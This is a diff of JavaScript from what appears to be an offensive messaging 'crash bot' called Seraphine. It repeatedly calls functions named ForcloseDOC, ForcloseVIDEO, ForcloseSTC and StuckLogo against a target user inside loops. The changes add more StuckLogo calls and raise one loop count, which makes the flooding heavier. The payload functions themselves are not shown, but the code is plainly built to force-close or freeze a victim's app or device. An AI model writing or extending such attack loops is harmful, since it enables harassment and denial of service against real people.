@@ -4078,13 +4078,15 @@ await StuckLogo(target)
 await ForcloseVIDEO(target)
 await ForcloseDOC(target)
 await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
 await ForcloseDOC(target)
 await starttime(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
 await ForcloseSTC(target)
+await StuckLogo(target)
 await ForcloseVIDEO(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - FORCE 🦠 ] ${target}`));
@@ -4112,10 +4114,14 @@ console.log(chalk.red(`[Seraphine - CORE VIP 🔥 ] ${target}`));
 async function crayxvol(target) {
 for (let i = 0; i < 30; i++) {
 await ForcloseDOC(target)
+await StuckLogo(target)
 await starttime(target)
 await ForcloseSTC(target)
+await StuckLogo(target)
 await ForcloseVIDEO(target)
+await StuckLogo(target)
 await ForcloseDOC(target)
+await StuckLogo(target)
 await starttime(target)
 await ForcloseSTC(target)
 await ForcloseVIDEO(target)
@@ -4135,7 +4141,12 @@ console.log(chalk.red(`[Seraphine - TRASH 🍃 ] ${target}`));
 }
 
 async function Crayxbayar(target) {
-for (let i = 0; i < 20; i++) {
+for (let i = 0; i < 25; i++) {
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
 await StuckLogo(target)
 await StuckLogo(target)
 await StuckLogo(target)
